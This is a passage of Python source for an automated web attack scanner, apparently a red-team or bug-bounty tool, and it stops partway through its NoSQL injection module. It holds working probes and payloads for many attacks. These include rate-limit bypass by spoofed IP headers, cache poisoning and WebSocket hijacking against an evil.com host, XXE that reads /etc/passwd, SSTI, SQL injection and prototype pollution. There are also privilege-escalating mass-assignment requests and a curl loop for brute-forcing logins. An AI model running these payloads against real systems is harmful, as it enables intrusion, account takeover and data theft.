# ══════════════════════════════════════════════════════════════
class HTTPParameterPollution:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("HPP-25: HTTP Parameter Pollution testing")
        base = profile.url.rstrip("/")
        vulns = []
        # Use params discovered from JS/Wayback
        params_to_test = list(set(profile.parameters[:10] + ["id","user","role","admin","price","amount"]))
        for param in params_to_test[:8]:
            # Duplicate param with different values
            url_dup  = f"{base}?{param}=SAFE&{param}=INJECTED"
            url_arr  = f"{base}?{param}[]=SAFE&{param}[]=INJECTED"
            for label, url in [("duplicate", url_dup), ("array_notation", url_arr)]:
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                if "INJECTED" in body and "SAFE" not in body.split("INJECTED")[0][-20:]:
                    warn(f"  HPP [{label}]: param '{param}' — INJECTED value used")
                    vulns.append({"param": param, "type": label, "url": url})
        if vulns:
            profile.findings.append(Finding(
                id="F-HPP-001", title="HTTP Parameter Pollution",
                severity="MEDIUM", cwe="CWE-235", cvss=5.3,
                description=f"Duplicate parameters accepted: {[v['param'] for v in vulns]}",
                evidence="\n".join(f"{v['type']}: {v['url'][:80]}" for v in vulns),
                reproduction="\n".join(f"curl -sk '{v['url']}'" for v in vulns[:2]),
                poc_curl=f"curl -sk '{vulns[0]['url']}'",
                category="Parameter Pollution",
                remediation="Accept only the first or last value of a parameter. Reject duplicates."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 26: RATE LIMIT BYPASS  (SKILL-36)
# ══════════════════════════════════════════════════════════════
class RateLimitBypassTester:
    BYPASS_HEADERS = [
        {"X-Forwarded-For": "127.0.0.1"},
        {"X-Real-IP": "127.0.0.1"},
        {"X-Originating-IP": "127.0.0.1"},
        {"X-Client-IP": "127.0.0.1"},
        {"CF-Connecting-IP": "127.0.0.1"},
        {"X-Forwarded-For": "0.0.0.0"},
        {"X-Forwarded-For": "10.0.0.1"},
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("RATELIMIT-26: Rate limit bypass via header spoofing")
        # Find a login/auth endpoint
        login_paths = ["/api/login", "/api/auth", "/login", "/api/token", "/auth/login"]
        login_url = None
        for path in login_paths:
            code, _, _ = _fetch(profile.url.rstrip("/") + path,
                                cfg.user_agent, cfg.timeout,
                                method="POST",
                                data=b'{"username":"test","password":"test"}',
                                headers_extra={"Content-Type": "application/json"})
            if code in [200, 400, 401, 403]:
                login_url = profile.url.rstrip("/") + path
                break
        if not login_url:
            info("  No login endpoint found for rate limit testing")
            return profile

        # Baseline — hit it 5 times and check for 429
        codes = []
        for _ in range(5):
            code, _, _ = _fetch(login_url, cfg.user_agent, 5,
                                method="POST", data=b'{"username":"test","password":"wrong"}',
                                headers_extra={"Content-Type": "application/json"})
            codes.append(code)
            time.sleep(0.2)

        if 429 in codes or 403 in codes:
            ok(f"  Rate limiting active on {login_url} (got {set(codes)})")
            # Try bypasses
            for bypass_hdrs in self.BYPASS_HEADERS:
                code, _, _ = _fetch(login_url, cfg.user_agent, 5,
                                    method="POST", data=b'{"username":"test","password":"wrong"}',
                                    headers_extra={"Content-Type":"application/json", **bypass_hdrs})
                if code not in [429, 403]:
                    high(f"  RATE LIMIT BYPASS via {bypass_hdrs}: HTTP {code}")
                    profile.findings.append(Finding(
                        id=f"F-RL-{len(profile.findings):03d}",
                        title="Rate Limit Bypass via Spoofed IP Header",
                        severity="MEDIUM", cwe="CWE-307", cvss=6.5,
                        description=f"Rate limiting bypassed by setting {list(bypass_hdrs.keys())[0]}.",
                        evidence=f"Normal: {set(codes)} | With {bypass_hdrs}: {code}",
                        reproduction=f"curl -sk -X POST '{login_url}' -H '{list(bypass_hdrs.keys())[0]}: 127.0.0.1' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"wordlist_entry\"}}'",
                        poc_curl=f"curl -sk -X POST '{login_url}' -H '{list(bypass_hdrs.keys())[0]}: 127.0.0.1' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"Password1\"}}'",
                        category="Rate Limiting",
                        remediation="Rate-limit by user/device fingerprint, not just IP. Block spoofed IP headers."
                    ))
                    break
        else:
            warn(f"  No rate limiting detected on {login_url} — brute-force possible!")
            profile.findings.append(Finding(
                id="F-RL-NORL", title="No Rate Limiting on Login Endpoint",
                severity="HIGH", cwe="CWE-307", cvss=7.5,
                description=f"Login endpoint {login_url} has no rate limiting.",
                evidence=f"5 requests returned: {codes}",
                reproduction=f"for i in $(seq 1 100); do curl -sk -X POST '{login_url}' -d '{{\"username\":\"admin\",\"password\":\"test$i\"}}'; done",
                poc_curl=f"curl -sk -X POST '{login_url}' -H 'Content-Type: application/json' -d '{{\"username\":\"admin\",\"password\":\"Password1\"}}'",
                category="Rate Limiting",
                remediation="Implement account lockout or CAPTCHA after 5 failed attempts."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 27: CACHE POISONING DETECTOR  (SKILL-37)
# ══════════════════════════════════════════════════════════════
class CachePoisoningDetector:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("CACHE-27: Cache poisoning via unkeyed headers")
        code, body, hdrs = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        is_cached = any(k in hdrs for k in ["x-cache","cf-cache-status","age","x-varnish","x-fastly"])
        if not is_cached:
            info("  No caching headers — cache poisoning less likely")
            return profile

        ok(f"  Caching detected: {[(k,hdrs[k]) for k in hdrs if k in ['x-cache','cf-cache-status','age']]}")

        # Test unkeyed X-Forwarded-Host header
        poison_code, poison_body, poison_hdrs = _fetch(
            profile.url, cfg.user_agent, cfg.timeout,
            headers_extra={"X-Forwarded-Host": "poison.evil.com",
                           "Cache-Control": "no-cache"})
        if "poison.evil.com" in poison_body:
            high("  CACHE POISONING: X-Forwarded-Host reflected in cached response!")
            profile.findings.append(Finding(
                id="F-CACHE-001", title="Web Cache Poisoning via X-Forwarded-Host",
                severity="HIGH", cwe="CWE-444", cvss=8.1,
                description="Unkeyed X-Forwarded-Host header reflected in cacheable response.",
                evidence=f"Header sent: X-Forwarded-Host: poison.evil.com\nReflected in body",
                reproduction=f"curl -sk -H 'X-Forwarded-Host: evil.com' '{profile.url}'",
                poc_curl=f"curl -sk -H 'X-Forwarded-Host: evil.com' -H 'Cache-Control: no-cache' '{profile.url}'",
                category="Cache Poisoning",
                remediation="Include all headers that influence responses as cache keys."
            ))

        # Cache deception path test
        for ext in [".css", ".jpg", ".js", ".png"]:
            deception_url = profile.url.rstrip("/") + "/profile" + ext
            code2, body2, hdrs2 = _fetch(deception_url, cfg.user_agent, cfg.timeout)
            if code2 == 200 and any(k in hdrs2 for k in ["x-cache","age"]):
                warn(f"  Cache deception candidate: {deception_url}")

        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 28: SSTI SCANNER  (SKILL-38)
# ══════════════════════════════════════════════════════════════
class SSTIScanner:
    ENGINE_MAP = {
        "49": "Jinja2/Twig/Pebble ({{7*7}}=49)",
        "7777777": "Twig ({{'7'*7}})",
        "0123456": "Jinja2 (range loop)",
    }

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SSTI-28: Server-Side Template Injection ({{7*7}} detection)")
        base = profile.url.rstrip("/")
        # Find input params from forms and Wayback
        test_params = list(set(profile.parameters[:5] + ["name","search","q","message","template","subject"]))
        confirmed = []

        for param in test_params[:8]:
            for payload in PAYLOADS_SSTI[:6]:
                test_url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(test_url, cfg.user_agent, cfg.timeout)
                # Check for evaluated result
                for indicator, engine in self.ENGINE_MAP.items():
                    if indicator in body and payload not in body:
                        high(f"  SSTI CONFIRMED! Param '{param}' payload '{payload}' → '{indicator}' ({engine})")
                        confirmed.append({"param": param, "payload": payload, "engine": engine, "url": test_url})
                        profile.ssti_params.append(param)
                # Also check POST forms
                if profile.forms:
                    for form in profile.forms[:3]:
                        action = form.get("action", base)
                        if not action.startswith("http"): action = base + action
                        p_code, p_body, _ = _fetch(action, cfg.user_agent, cfg.timeout,
                                                   method="POST",
                                                   data=urllib.parse.urlencode({param: payload}).encode())
                        for indicator, engine in self.ENGINE_MAP.items():
                            if indicator in p_body and payload not in p_body:
                                high(f"  SSTI CONFIRMED (POST form)! '{param}' → '{indicator}' ({engine})")
                                confirmed.append({"param": param, "payload": payload, "engine": engine, "url": action})

        if confirmed:
            profile.findings.append(Finding(
                id="F-SSTI-001", title="Server-Side Template Injection (SSTI)",
                severity="CRITICAL", cwe="CWE-94", cvss=9.8,
                description=f"SSTI confirmed in params: {[c['param'] for c in confirmed]}. Engine: {confirmed[0]['engine']}",
                evidence="\n".join(f"{c['param']}: {c['payload']} → evaluated | {c['engine']}" for c in confirmed),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:2]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="SSTI",
                remediation="Never pass user input to template engines. Use sandboxed rendering or static templates."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 29: XXE INJECTION PROBER  (SKILL-39)
# ══════════════════════════════════════════════════════════════
class XXEProber:
    XML_ENDPOINTS = ["/api", "/api/v1", "/upload", "/api/import",
                     "/ws", "/soap", "/service", "/api/parse","/xmlrpc.php"]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("XXE-29: XML injection + SOAP endpoint probing")
        base = profile.url.rstrip("/")
        found = []

        for path in self.XML_ENDPOINTS:
            url = base + path
            for payload in PAYLOADS_XXE[:2]:
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                       method="POST", data=payload.encode(),
                                       headers_extra={"Content-Type": "application/xml",
                                                      "Accept": "application/xml,text/xml,*/*"})
                if code == 200 and ("root:" in body or "bin:" in body or "nobody:" in body):
                    high(f"  XXE CONFIRMED at {url} — /etc/passwd read!")
                    found.append({"url": url, "payload": payload[:60]})
                elif code in [400, 500] and "xml" in body.lower():
                    warn(f"  XML parsing error at {url} [{code}] — investigate manually")
                elif code == 200 and code != 0:
                    # Check for SSRF OOB reflection
                    if "169.254" in body or "metadata" in body.lower():
                        high(f"  XXE OOB/SSRF via {url}")
                        found.append({"url": url, "payload": payload[:60]})

        # Also check for SVG upload vectors
        _, html_body, _ = _fetch(profile.url, cfg.user_agent, cfg.timeout)
        svg_inputs = re.findall(r'<input[^>]*accept=["\'][^"\']*(?:svg|image)[^"\']*["\'][^>]*>', html_body, re.I)
        if svg_inputs:
            warn(f"  SVG upload input found — test XXE via SVG")
            found.append({"url": profile.url, "payload": "SVG upload vector", "note": "manual"})

        if found:
            profile.findings.append(Finding(
                id="F-XXE-001", title="XXE / XML External Entity Injection",
                severity="CRITICAL" if any("passwd" in f.get("payload","") for f in found) else "HIGH",
                cwe="CWE-611", cvss=9.1,
                description=f"XXE injection points identified at {[f['url'] for f in found]}",
                evidence="\n".join(f"{f['url']}: {f['payload']}" for f in found),
                reproduction="\n".join(f"curl -sk -X POST '{f['url']}' -H 'Content-Type: application/xml' -d '{PAYLOADS_XXE[0][:100]}...'" for f in found[:2]),
                poc_curl=f"curl -sk -X POST '{found[0]['url']}' -H 'Content-Type: application/xml' -d '<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><foo>&xxe;</foo>'",
                category="XXE",
                remediation="Disable external entity processing. Use a safe XML parser configuration."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 30: PROTOTYPE POLLUTION SCANNER  (SKILL-40)
# ══════════════════════════════════════════════════════════════
class PrototypePollutionScanner:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("PROTO-30: Prototype Pollution (__proto__, constructor.prototype)")
        base = profile.url.rstrip("/")
        vulns = []

        # Test URL-based prototype pollution
        test_url = f"{base}?__proto__[polluted]=APEX_TEST&constructor[prototype][polluted]=APEX_TEST"
        code, body, hdrs = _fetch(test_url, cfg.user_agent, cfg.timeout)
        if "APEX_TEST" in body:
            high(f"  PROTOTYPE POLLUTION via URL params!")
            vulns.append({"type": "url_param", "url": test_url})

        # Test JSON body prototype pollution on API endpoints
        for path in ["/api", "/api/v1", "/api/user", "/api/settings"]:
            url = base + path
            for payload in PAYLOADS_PROTO_POLLUTION:
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout,
                                         method="POST", data=payload.encode(),
                                         headers_extra={"Content-Type": "application/json"})
                if code in [200, 201] and "APEX_HUNTER" in body:
                    high(f"  PROTOTYPE POLLUTION via JSON body at {path}!")
                    vulns.append({"type": "json_body", "url": url, "payload": payload})

        if vulns:
            profile.findings.append(Finding(
                id="F-PP-001", title="Prototype Pollution Vulnerability",
                severity="HIGH", cwe="CWE-1321", cvss=8.1,
                description=f"Prototype pollution via: {[v['type'] for v in vulns]}",
                evidence="\n".join(f"{v['type']}: {v.get('url','')} | {v.get('payload','')[:60]}" for v in vulns),
                reproduction=f"curl -sk '{base}?__proto__[polluted]=yes' | grep polluted",
                poc_curl=f"curl -sk '{base}?__proto__[polluted]=APEX_TEST'",
                category="Prototype Pollution",
                remediation="Use Object.create(null) for config maps. Freeze Object.prototype. Validate JSON keys."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# TOOL 31: GRAPHQL ADVANCED ATTACK SUITE  (SKILL-41)
# ══════════════════════════════════════════════════════════════
class GraphQLAdvanced:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("GQL-ADV-31: GraphQL batch attacks + alias introspection bypass")
        if not profile.graphql_endpoints:
            return profile
        for gql_url in profile.graphql_endpoints[:2]:
            # Alias-based introspection bypass (bypasses disabled introspection)
            alias_query = json.dumps({"query": "{a:__typename b:__schema{types{name}}}"})
            code, body, _ = _fetch(gql_url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=alias_query.encode(),
                                   headers_extra={"Content-Type":"application/json"})
            if code == 200 and "__schema" in body:
                high(f"  GRAPHQL: Alias introspection bypass works at {gql_url}")
            # Batch query attack — alias multiplication
            batch = json.dumps({"query": " ".join(
                f"q{i}: __typename" for i in range(100))})
            code2, body2, _ = _fetch(gql_url, cfg.user_agent, cfg.timeout,
                                     method="POST", data=batch.encode(),
                                     headers_extra={"Content-Type":"application/json"})
            if code2 == 200 and "q99" in body2:
                warn(f"  GRAPHQL BATCH: 100-alias query accepted — brute-force/DoS risk")
                profile.findings.append(Finding(
                    id="F-GQL-ADV-001", title="GraphQL Batch Query Attack",
                    severity="MEDIUM", cwe="CWE-770", cvss=6.5,
                    description="GraphQL accepts batched alias queries enabling brute-force or DoS.",
                    evidence=f"100 aliased queries returned HTTP {code2}",
                    reproduction=f"curl -sk -X POST '{gql_url}' -H 'Content-Type: application/json' -d '{{\"query\":\"{{q1:__typename q2:__typename ... q100:__typename}}\"}}'",
                    poc_curl=f"curl -sk -X POST '{gql_url}' -H 'Content-Type: application/json' -d '{batch[:150]}'",
                    category="GraphQL",
                    remediation="Implement query complexity limits and alias count restrictions."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 32: DEPENDENCY CONFUSION DETECTOR  (SKILL-42)
# ══════════════════════════════════════════════════════════════
class DependencyConfusionDetector:
    MANIFEST_PATHS = ["/package.json", "/composer.json", "/requirements.txt",
                      "/Gemfile", "/build.gradle", "/pom.xml", "/go.mod",
                      "/yarn.lock", "/package-lock.json", "/Pipfile"]

    INTERNAL_PATTERNS = re.compile(
        r'(?i)(@company|@internal|@private|@corp|@myorg|@local|'
        r'internal-|private-|corp-|company-|intranet-)')

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("DEPCNF-32: Dependency confusion / supply chain detector")
        base = profile.url.rstrip("/")
        findings = []

        for path in self.MANIFEST_PATHS:
            code, body, _ = _fetch(base + path, cfg.user_agent, cfg.timeout)
            if code == 200 and body:
                high(f"  MANIFEST EXPOSED: {path} ({len(body)}b)")
                # Extract package names
                pkg_names = []
                try:
                    if path == "/package.json":
                        data = json.loads(body)
                        deps = {**data.get("dependencies",{}), **data.get("devDependencies",{})}
                        pkg_names = list(deps.keys())
                    elif path == "/requirements.txt":
                        pkg_names = [line.split("==")[0].split(">=")[0].strip()
                                     for line in body.splitlines() if line.strip() and not line.startswith("#")]
                except Exception: pass

                # Check for internal package naming patterns
                for pkg in pkg_names:
                    if self.INTERNAL_PATTERNS.search(pkg):
                        high(f"  INTERNAL PACKAGE NAME: '{pkg}' — dependency confusion candidate!")
                        findings.append({"pkg": pkg, "source": path})

                profile.sensitive_paths.append(path)
                profile.findings.append(Finding(
                    id=f"F-DEP-{len(profile.findings):03d}",
                    title=f"Dependency Manifest Exposed: {path}",
                    severity="HIGH" if findings else "MEDIUM",
                    cwe="CWE-829", cvss=8.1 if findings else 5.3,
                    description=f"Package manifest {path} is publicly accessible." +
                                (f" Internal package names found: {[f['pkg'] for f in findings]}" if findings else ""),
                    evidence=body[:200],
                    reproduction=f"curl -s '{base+path}'",
                    poc_curl=f"curl -sk '{base+path}'",
                    category="Supply Chain",
                    remediation="Block access to manifest files. Use private registry for internal packages."
                ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 33: BUSINESS LOGIC PROBE  (SKILL-43)
# ══════════════════════════════════════════════════════════════
class BusinessLogicProbe:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BIZ-33: Business logic (negative price, integer overflow, coupon)")
        base = profile.url.rstrip("/")
        test_cases = [
            ("negative_price",   {"price": -1, "amount": -1, "quantity": -1}),
            ("zero_price",       {"price": 0, "amount": 0, "cost": 0}),
            ("overflow",         {"price": 99999999999, "quantity": 2147483648}),
            ("coupon_empty",     {"coupon": "", "promo": ""}),
            ("coupon_null",      {"coupon": None, "discount_code": None}),
        ]
        cart_paths = ["/api/cart", "/api/order", "/api/checkout", "/api/purchase",
                      "/cart", "/checkout", "/api/v1/orders", "/api/booking"]
        vulns = []

        for path in cart_paths[:5]:
            url = base + path
            code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
            if code not in [200, 201, 400, 401]: continue
            # Try each logic test case
            for label, params in test_cases:
                payload = json.dumps(params).encode()
                tc, tb, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                   method="POST", data=payload,
                                   headers_extra={"Content-Type":"application/json"})
                if tc in [200, 201]:
                    # Look for success indicators
                    if any(k in tb.lower() for k in ["success","order_id","booking_id","confirmed","total"]):
                        high(f"  BUSINESS LOGIC [{label}] at {path}: got {tc} — check total amount!")
                        vulns.append({"label": label, "path": path, "params": params})

        if vulns:
            profile.findings.append(Finding(
                id="F-BIZ-001", title="Business Logic Vulnerability",
                severity="HIGH", cwe="CWE-840", cvss=8.1,
                description=f"Business logic issues: {[v['label'] for v in vulns]}",
                evidence="\n".join(f"{v['label']} at {v['path']}: {v['params']}" for v in vulns),
                reproduction="\n".join(
                    "curl -sk -X POST '" + base + v["path"] + "' -H 'Content-Type: application/json' -d '" + json.dumps(v["params"]) + "'"
                    for v in vulns[:2]),
                poc_curl="curl -sk -X POST '" + base + vulns[0]["path"] + "' -H 'Content-Type: application/json' -d '" + json.dumps(vulns[0]["params"]) + "'",
                category="Business Logic",
                remediation="Validate all numeric inputs server-side. Reject negative/zero prices. Enforce coupon rules."
            ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 34: WEBSOCKET SECURITY TESTER  (SKILL-44)
# ══════════════════════════════════════════════════════════════
class WebSocketTester:
    WS_PATHS = ["/ws", "/websocket", "/socket", "/socket.io",
                "/api/ws", "/chat", "/live", "/stream", "/realtime"]

    def _detect_ws_upgrade(self, url: str, ua: str, timeout: int) -> bool:
        code, body, hdrs = _fetch(url, ua, timeout,
                                  headers_extra={"Connection": "Upgrade",
                                                 "Upgrade": "websocket",
                                                 "Sec-WebSocket-Version": "13",
                                                 "Sec-WebSocket-Key": base64.b64encode(os.urandom(16)).decode()})
        return code == 101 or hdrs.get("upgrade","").lower() == "websocket"

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("WS-34: WebSocket security (CSWSH, ws:// downgrade, Origin bypass)")
        base = profile.url.rstrip("/")
        ws_found = []

        # Detect WS endpoints from JS
        for js_url in profile.js_files[:10]:
            _, content, _ = _fetch(js_url, cfg.user_agent, cfg.timeout)
            ws_refs = re.findall(r'wss?://[^\s"\'<>]+', content)
            for ref in ws_refs:
                ws_found.append(ref); warn(f"  WebSocket URL in JS: {ref}")
                profile.websocket_endpoints.append(ref)

        # Probe known WS paths
        for path in self.WS_PATHS:
            url = base + path
            if self._detect_ws_upgrade(url, cfg.user_agent, 5):
                high(f"  WebSocket endpoint: {url}")
                ws_found.append(url)
                profile.websocket_endpoints.append(url)
            # Also check HTML for socket references
            code, body, _ = _fetch(url, cfg.user_agent, 5)
            if code == 200 and re.search(r'socket\.io|websocket|ws\.connect', body, re.I):
                ws_found.append(url)

        if ws_found:
            # CSWSH test — send cross-origin request
            for ws_url in ws_found[:3]:
                http_url = ws_url.replace("wss://","https://").replace("ws://","http://")
                code, body, hdrs = _fetch(http_url, cfg.user_agent, cfg.timeout,
                                         headers_extra={"Origin": "https://evil.com"})
                upgrade = hdrs.get("upgrade","")
                if code == 101 or "websocket" in upgrade.lower():
                    high(f"  CSWSH: Cross-origin WebSocket connection accepted from evil.com!")
                    profile.findings.append(Finding(
                        id=f"F-WS-{len(profile.findings):03d}",
                        title="Cross-Site WebSocket Hijacking (CSWSH)",
                        severity="HIGH", cwe="CWE-346", cvss=8.1,
                        description=f"WebSocket at {ws_url} accepts connections from arbitrary origins.",
                        evidence=f"Origin: evil.com → HTTP {code} | Upgrade: {upgrade}",
                        reproduction=f"# Browser PoC:\nnew WebSocket('{ws_url}')",
                        poc_curl=f"curl -sk -H 'Origin: https://evil.com' -H 'Upgrade: websocket' -H 'Connection: Upgrade' -H 'Sec-WebSocket-Version: 13' -H 'Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==' '{http_url}'",
                        category="WebSocket",
                        remediation="Validate Origin header against allowlist. Require auth tokens in WS handshake."
                    ))

            # Check for ws:// (no TLS) downgrade
            for ws_url in ws_found:
                if ws_url.startswith("ws://"):
                    warn(f"  WS DOWNGRADE: Unencrypted ws:// in use: {ws_url}")
                    profile.findings.append(Finding(
                        id=f"F-WS-PLAIN-{len(profile.findings):03d}",
                        title="Unencrypted WebSocket (ws://)",
                        severity="MEDIUM", cwe="CWE-311", cvss=5.9,
                        description=f"WebSocket communication without TLS: {ws_url}",
                        evidence=f"URL: {ws_url}",
                        reproduction=f"Intercept WebSocket traffic with mitmproxy",
                        poc_curl=f"# Cannot test with curl — use websocat: websocat '{ws_url}'",
                        category="WebSocket",
                        remediation="Use wss:// exclusively. Redirect ws:// to wss://."
                    ))
        return profile

# ══════════════════════════════════════════════════════════════
# TOOL 35: IDOR DEEP SCANNER / BOLA  (SKILL-45)
# ══════════════════════════════════════════════════════════════
class IDORDeepScanner:
    BOLA_PATHS = [
        "/api/users/{id}", "/api/user/{id}", "/api/accounts/{id}",
        "/api/tickets/{id}", "/api/orders/{id}", "/api/bookings/{id}",
        "/api/invoices/{id}", "/api/requests/{id}", "/api/cards/{id}",
        "/hc/requests/{id}", "/api/v1/users/{id}", "/api/v2/tickets/{id}",
    ]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("BOLA-35: IDOR deep scanner (BOLA, mass assignment, privilege escalation)")
        base = profile.url.rstrip("/")
        vulns = []

        # Test BOLA — enumerate adjacent IDs on known patterns
        for path_tpl in self.BOLA_PATHS:
            for test_id in [1, 2, 100, 1000, 9999]:
                url = base + path_tpl.replace("{id}", str(test_id))
                code, body, hdrs = _fetch(url, cfg.user_agent, cfg.timeout)
                if code == 200 and len(body) > 50:
                    # Check if response looks like real user data
                    data_indicators = ["email","name","username","phone","id","created","updated"]
                    if sum(1 for d in data_indicators if d in body.lower()) >= 3:
                        warn(f"  BOLA candidate: {url} ({len(body)}b)")
                        vulns.append({"url": url, "id": test_id, "size": len(body)})
                        # Check for mass assignment — try PATCH with extra fields
                        patch_payload = json.dumps({"role":"admin","is_admin":True,"admin":True,"privilege":"superuser"}).encode()
                        p_code, p_body, _ = _fetch(url, cfg.user_agent, cfg.timeout,
                                                   method="PATCH", data=patch_payload,
                                                   headers_extra={"Content-Type":"application/json"})
                        if p_code in [200, 201]:
                            high(f"  MASS ASSIGNMENT accepted at {url}!")
                            profile.findings.append(Finding(
                                id=f"F-MASS-{len(profile.findings):03d}",
                                title="Mass Assignment Vulnerability",
                                severity="CRITICAL", cwe="CWE-915", cvss=9.8,
                                description=f"PATCH {url} accepted admin/role fields without restriction.",
                                evidence=f"URL: {url} | PATCH {patch_payload.decode()[:80]} → HTTP {p_code}",
                                reproduction=f"curl -sk -X PATCH '{url}' -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true}}'",
                                poc_curl=f"curl -sk -X PATCH '{url}' -H 'Content-Type: application/json' -d '{{\"role\":\"admin\",\"is_admin\":true}}'",
                                category="Mass Assignment",
                                remediation="Use explicit allowlists for accepted fields. Never bind request body directly to model."
                            ))
                        break  # Found one — move to next pattern

        if vulns:
            # Check if IDs are sequential (BOLA more severe)
            sizes = [v["size"] for v in vulns]
            sequential = len(set(v["id"] for v in vulns)) == len(vulns)
            profile.findings.append(Finding(
                id="F-BOLA-001", title="Broken Object Level Authorization (BOLA/IDOR)",
                severity="HIGH", cwe="CWE-639", cvss=8.6,
                description=f"API returns other users' data without authorization check. {len(vulns)} endpoints confirmed.",
                evidence="\n".join(f"ID {v['id']}: {v['url']} ({v['size']}b)" for v in vulns[:5]),
                reproduction="\n".join(f"curl -sk '{v['url']}'" for v in vulns[:3]),
                poc_curl=f"curl -sk '{vulns[0]['url']}'",
                category="IDOR/BOLA",
                remediation="Implement object-level authorization checks. Verify resource ownership on every request."
            ))
        return profile


# ══════════════════════════════════════════════════════════════
# ██████╗ ██╗  ██╗ █████╗ ███████╗███████╗     █████╗
# ██╔══██╗██║  ██║██╔══██╗██╔════╝██╔════╝    ██╔══██╗
# ██████╔╝███████║███████║███████╗█████╗      ╚█████╔╝
# ██╔═══╝ ██╔══██║██╔══██║╚════██║██╔══╝      ██╔══██╗
# ██║     ██║  ██║██║  ██║███████║███████╗    ╚█████╔╝
# ╚═╝     ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝    ╚════╝
# TOOLS 36-65 — 30 Advanced Red Team Skills (Phase 8)
# ══════════════════════════════════════════════════════════════

# ── TOOL 36: SQL INJECTION SCANNER  (SKILL-46) ─────────────
class SQLiScanner:
    """Error-based, boolean-blind, time-safe SQLi detection."""
    ERROR_SIGS = [
        r"you have an error in your sql syntax",
        r"warning: mysql",r"unclosed quotation mark",
        r"pg_query\(\).*failed",r"ora-\d{4,5}:",
        r"microsoft ole db provider for sql server",
        r"sqlite3\.operationalerror",r"syntax error.*near",
        r"invalid query",r"com\.microsoft\.sqlserver",
    ]
    BOOL_PAYLOADS = [("' AND 1=1--","' AND 1=2--"),("1 AND 1=1","1 AND 1=2")]

    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("SQLI-36: SQL Injection (error-based + boolean-blind detection)")
        base = profile.url.rstrip("/")
        params = list(set(profile.parameters[:8] + ["id","user","search","q","name","email","category","order"]))
        confirmed = []
        for param in params[:10]:
            # Error-based
            for payload in ["'", '"', "''", "1 UNION SELECT NULL--"]:
                url = f"{base}?{param}={urllib.parse.quote(payload)}"
                code, body, _ = _fetch(url, cfg.user_agent, cfg.timeout)
                for sig in self.ERROR_SIGS:
                    if re.search(sig, body, re.I):
                        high(f"  SQLi ERROR: param '{param}' | sig: {sig[:40]}")
                        confirmed.append({"param":param,"type":"error","payload":payload,"url":url})
                        break
            # Boolean-blind — compare responses
            for true_p, false_p in self.BOOL_PAYLOADS:
                url_t = f"{base}?{param}={urllib.parse.quote(true_p)}"
                url_f = f"{base}?{param}={urllib.parse.quote(false_p)}"
                ct, bt, _ = _fetch(url_t, cfg.user_agent, cfg.timeout)
                cf, bf, _ = _fetch(url_f, cfg.user_agent, cfg.timeout)
                if ct == cf and ct == 200 and abs(len(bt)-len(bf)) > 50:
                    warn(f"  SQLi BOOLEAN: param '{param}' — response length diff {len(bt)} vs {len(bf)}")
                    confirmed.append({"param":param,"type":"boolean","payload":true_p,"url":url_t})
            # POST body
            for payload in ["'", "1 AND 1=1"]:
                p_code, p_body, _ = _fetch(base, cfg.user_agent, cfg.timeout,
                    method="POST", data=urllib.parse.urlencode({param: payload}).encode())
                for sig in self.ERROR_SIGS:
                    if re.search(sig, p_body, re.I):
                        high(f"  SQLi POST ERROR: param '{param}'")
                        confirmed.append({"param":param,"type":"error_post","payload":payload,"url":base})
        if confirmed:
            profile.findings.append(Finding(
                id="F-SQLI-001", title="SQL Injection Detected",
                severity="CRITICAL", cwe="CWE-89", cvss=9.8,
                description=f"SQL injection in params: {list(set(c['param'] for c in confirmed))}",
                evidence="\n".join(f"{c['type']} | {c['param']}: {c['payload']}" for c in confirmed[:5]),
                reproduction="\n".join(f"curl -sk '{c['url']}'" for c in confirmed[:3]),
                poc_curl=f"curl -sk '{confirmed[0]['url']}'",
                category="SQL Injection",
                remediation="Use parameterized queries / prepared statements. Never concatenate user input into SQL."
            ))
        return profile

# ── TOOL 37: NOSQL INJECTION  (SKILL-47) ───────────────────
class NoSQLInjection:
    def run(self, profile: TargetProfile, cfg: Config) -> TargetProfile:
        skill("NOSQLI-37: NoSQL/MongoDB operator injection")
        base = profile.url.rstrip("/")
        payloads_json = [
            '{"$gt":""}', '{"$ne":null}', '{"$regex":".*"}',
            '{"$where":"1==1"}', '{"$exists":true}',
        ]
        payloads_url = ["[$gt]=", "[$ne]=null", "[$regex]=.*", "[$exists]=true"]
